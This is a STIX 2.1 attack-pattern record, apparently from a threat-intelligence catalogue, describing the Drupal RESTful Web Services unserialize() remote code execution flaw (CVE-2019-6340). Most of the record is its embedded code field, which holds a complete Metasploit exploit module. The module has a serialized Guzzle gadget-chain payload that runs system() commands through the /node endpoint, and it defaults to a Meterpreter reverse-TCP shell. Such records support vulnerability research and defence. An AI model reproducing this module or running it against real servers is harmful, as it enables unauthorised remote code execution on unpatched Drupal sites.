{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--41a04eb2-66fd-408b-a263-0646265f3f5d",
    "created": "2024-08-14T17:12:13.17717Z",
    "modified": "2024-08-14T17:12:13.177174Z",
    "name": "Drupal RESTful Web Services unserialize() RCE",
    "description": " This module exploits a PHP unserialize() vulnerability in Drupal RESTful Web Services by sending a crafted request to the /node REST endpoint.  As per SA-CORE-2019-003, the initial remediation was to disable POST PATCH, and PUT, but Ambionics discovered that GET was also vulnerable (albeit cached). Cached nodes can be exploited only once.  Drupal updated SA-CORE-2019-003 with PSA-2019-02-22 to notify users of this alternate vector.  Drupal < 8.5.11 and < 8.6.10 are vulnerable. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/drupal_restws_unserialize.rb",
            "external_id": "drupal_restws_unserialize.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-6340"
        },
        {
            "source_name": "reference",
            "url": "https://www.drupal.org/sa-core-2019-003"
        },
        {
            "source_name": "reference",
            "url": "https://www.drupal.org/psa-2019-02-22"
        },
        {
            "source_name": "reference",
            "url": "https://www.ambionics.io/blog/drupal8-rce"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/ambionics/phpggc"
        },
        {
            "source_name": "reference",
            "url": "https://twitter.com/jcran/status/1099206271901798400"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  # NOTE: All (four) Web Services modules need to be enabled\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HTTP::Drupal\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'               => 'Drupal RESTful Web Services unserialize() RCE',\n      'Description'        => %q{\n        This module exploits a PHP unserialize() vulnerability in Drupal RESTful\n        Web Services by sending a crafted request to the /node REST endpoint.\n\n        As per SA-CORE-2019-003, the initial remediation was to disable POST,\n        PATCH, and PUT, but Ambionics discovered that GET was also vulnerable\n        (albeit cached). Cached nodes can be exploited only once.\n\n        Drupal updated SA-CORE-2019-003 with PSA-2019-02-22 to notify users of\n        this alternate vector.\n\n        Drupal < 8.5.11 and < 8.6.10 are vulnerable.\n      },\n      'Author'             => [\n        'Jasper Mattsson', # Discovery\n        'Charles Fol',     # PoC\n        'Rotem Reiss',     # Module\n        'wvu'              # Module\n      ],\n      'References'         => [\n        ['CVE', '2019-6340'],\n        ['URL', 'https://www.drupal.org/sa-core-2019-003'],\n        ['URL', 'https://www.drupal.org/psa-2019-02-22'],\n        ['URL', 'https://www.ambionics.io/blog/drupal8-rce'],\n        ['URL', 'https://github.com/ambionics/phpggc'],\n        ['URL', 'https://twitter.com/jcran/status/1099206271901798400']\n      ],\n      'DisclosureDate'     => '2019-02-20',\n      'License'            => MSF_LICENSE,\n      'Platform'           => ['php', 'unix'],\n      'Arch'               => [ARCH_PHP, ARCH_CMD],\n      'Privileged'         => false,\n      'Targets'            => [\n        ['PHP In-Memory',\n          'Platform'       => 'php',\n          'Arch'           => ARCH_PHP,\n          'Type'           => :php_memory,\n          'Payload'        => {'BadChars' => \"'\"},\n          'DefaultOptions' => {\n            'PAYLOAD'      => 'php/meterpreter/reverse_tcp'\n          }\n        ],\n        ['Unix In-Memory',\n          'Platform'       => 'unix',\n          'Arch'           => ARCH_CMD,\n          'Type'           => :unix_memory,\n          'DefaultOptions' => {\n            'PAYLOAD'      => 'cmd/unix/generic',\n            'CMD'          => 'id'\n          }\n        ]\n      ],\n      'DefaultTarget'      => 0,\n      'Notes'              => {\n        'AKA'              => ['SA-CORE-2019-003'],\n        'Stability'        => [CRASH_SAFE],\n        'SideEffects'      => [IOC_IN_LOGS],\n        'Reliability'      => [UNRELIABLE_SESSION] # When using the GET method\n      }\n    ))\n\n    register_options([\n      OptEnum.new('METHOD',      [true, 'HTTP method to use', 'POST',\n                                 ['GET', 'POST', 'PATCH', 'PUT']]),\n      OptInt.new('NODE',         [false, 'Node ID to target with GET method', 1]),\n      OptBool.new('DUMP_OUTPUT', [false, 'Dump payload command output', false])\n    ])\n  end\n\n  def check\n    checkcode = CheckCode::Unknown\n\n    version = drupal_version\n\n    unless version\n      vprint_error('Could not determine Drupal version')\n      return checkcode\n    end\n\n    if version.to_s !~ /^8\\b/\n      vprint_error(\"Drupal #{version} is not supported\")\n      return CheckCode::Safe\n    end\n\n    vprint_status(\"Drupal #{version} targeted at #{full_uri}\")\n    checkcode = CheckCode::Detected\n\n    changelog = drupal_changelog(version)\n\n    unless changelog\n      vprint_error('Could not determine Drupal patch level')\n      return checkcode\n    end\n\n    case drupal_patch(changelog, 'SA-CORE-2019-003')\n    when nil\n      vprint_warning('CHANGELOG.txt no longer contains patch level')\n    when true\n      vprint_warning('Drupal appears patched in CHANGELOG.txt')\n      checkcode = CheckCode::Safe\n    when false\n      vprint_good('Drupal appears unpatched in CHANGELOG.txt')\n      checkcode = CheckCode::Appears\n    end\n\n    # Any further with GET and we risk caching the targeted node\n    return checkcode if meth == 'GET'\n\n    # NOTE: Exploiting the vuln will move us from \"Safe\" to Vulnerable\n    token = Rex::Text.rand_text_alphanumeric(8..42)\n    res   = execute_command(\"echo #{token}\")\n\n    return checkcode unless res\n\n    if res.body.include?(token)\n      vprint_good('Drupal is vulnerable to code execution')\n      checkcode = CheckCode::Vulnerable\n    end\n\n    checkcode\n  end\n\n  def exploit\n    if datastore['PAYLOAD'] == 'cmd/unix/generic'\n      print_warning('Enabling DUMP_OUTPUT for cmd/unix/generic')\n      # XXX: Naughty datastore modification\n      datastore['DUMP_OUTPUT'] = true\n    end\n\n    case target['Type']\n    when :php_memory\n      # XXX: This will spawn a *very* obvious process\n      execute_command(\"php -r '#{payload.encoded}'\")\n    when :unix_memory\n      execute_command(payload.encoded)\n    end\n  end\n\n  def execute_command(cmd, opts = {})\n    vprint_status(\"Executing with system(): #{cmd}\")\n\n    # https://en.wikipedia.org/wiki/Hypertext_Application_Language\n    hal_json = JSON.pretty_generate(\n      'link'      => [\n        'value'   => 'link',\n        'options' => phpggc_payload(cmd)\n      ],\n      '_links'    => {\n        'type'    => {\n          'href'  => vhost_uri\n        }\n      }\n    )\n\n    print_status(\"Sending #{meth} to #{node_uri} with link #{vhost_uri}\")\n\n    res = send_request_cgi({\n      'method'   => meth,\n      'uri'      => node_uri,\n      'ctype'    => 'application/hal+json',\n      'vars_get' => {'_format' => 'hal_json'},\n      'data'     => hal_json\n    }, 3.5)\n\n    return unless res\n\n    case res.code\n    # 401 isn't actually a failure when using the POST method\n    when 200, 401\n      print_line(res.body) if datastore['DUMP_OUTPUT']\n      if meth == 'GET'\n        print_warning('If you did not get code execution, try a new node ID')\n      end\n    when 404\n      print_error(\"#{node_uri} not found\")\n    when 405\n      print_error(\"#{meth} method not allowed\")\n    when 422\n      print_error('VHOST may need to be set')\n    when 406\n      print_error('Web Services may not be enabled')\n    else\n      print_error(\"Unexpected reply: #{res.inspect}\")\n    end\n\n    res\n  end\n\n  # phpggc Guzzle/RCE1 system id\n  def phpggc_payload(cmd)\n    (\n      # http://www.phpinternalsbook.com/classes_objects/serialization.html\n      <<~EOF\n        O:24:\"GuzzleHttp\\\\Psr7\\\\FnStream\":2:{\n          s:33:\"\\u0000GuzzleHttp\\\\Psr7\\\\FnStream\\u0000methods\";a:1:{\n            s:5:\"close\";a:2:{\n              i:0;O:23:\"GuzzleHttp\\\\HandlerStack\":3:{\n                s:32:\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000handler\";\n                  s:cmd_len:\"cmd\";\n                s:30:\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000stack\";\n                  a:1:{i:0;a:1:{i:0;s:6:\"system\";}}\n                s:31:\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000cached\";\n                  b:0;\n              }\n              i:1;s:7:\"resolve\";\n            }\n          }\n          s:9:\"_fn_close\";a:2:{\n            i:0;r:4;\n            i:1;s:7:\"resolve\";\n          }\n        }\n      EOF\n    ).gsub(/\\s+/, '').gsub('cmd_len', cmd.length.to_s).gsub('cmd', cmd)\n  end\n\n  def meth\n    datastore['METHOD'] || 'POST'\n  end\n\n  def node\n    datastore['NODE'] || 1\n  end\n\n  def node_uri\n    if meth == 'GET'\n      normalize_uri(target_uri.path, '/node', node)\n    else\n      normalize_uri(target_uri.path, '/node')\n    end\n  end\n\n  def vhost_uri\n    full_uri(\n      normalize_uri(target_uri.path, '/rest/type/shortcut/default'),\n      vhost_uri: true\n    )\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2019-02-20",
    "x_mitre_platforms": [
        "unix'"
    ]
}